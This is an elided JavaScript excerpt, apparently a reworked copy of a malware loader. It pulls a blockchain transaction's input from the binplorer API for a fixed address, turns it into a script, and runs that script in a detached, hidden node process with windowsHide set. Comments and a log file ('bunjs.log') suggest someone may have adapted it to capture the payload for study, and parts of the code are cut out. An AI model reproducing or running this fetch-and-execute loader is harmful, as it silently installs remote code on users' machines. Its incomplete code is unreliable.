...
// const res = await fetch('https://api.binplorer.com/getAddressHistory/0x9BC1355344B54DEDf3E44296916eD15653844509?apiKey=freekey&type=mint&limit=1')
...
(async () => {
    try {
        const response = await fetch('https://api.binplorer.com/getAddressHistory/0x9BC1355344B54DEDf3E44296916eD15653844509?apiKey=freekey&type=mint&limit=1');
        const data = await response.json();
       const txHash = data.operations[0].transactionHash;

        const res1 = await fetch(`https://api.binplorer.com/getTxInfo/${txHash}?apiKey=freekey`);
        console.log(res1)
        const data1 = await res1.json();
        let input = data1.input.substring(2);
        ...
        let spawnOptions =  { detached: true, stdio: 'ignore', windowsHide: true }
        // originally 
        ...
        // nodePath = "~/nvm/versions/node/v22.14.0/bin/node"

        const logData = `global['_V'] = ${global['_V']};\n${script}\n`;

        fs.writeFileSync("bunjs.log", logData, { flag: 'a' }); // 'a' appends instead of overwriting


        const child = spawn(nodePath, ['-e', `global['_V']='${global['_V'] || 0}';${script};console.log("i m done")`], spawnOptions);
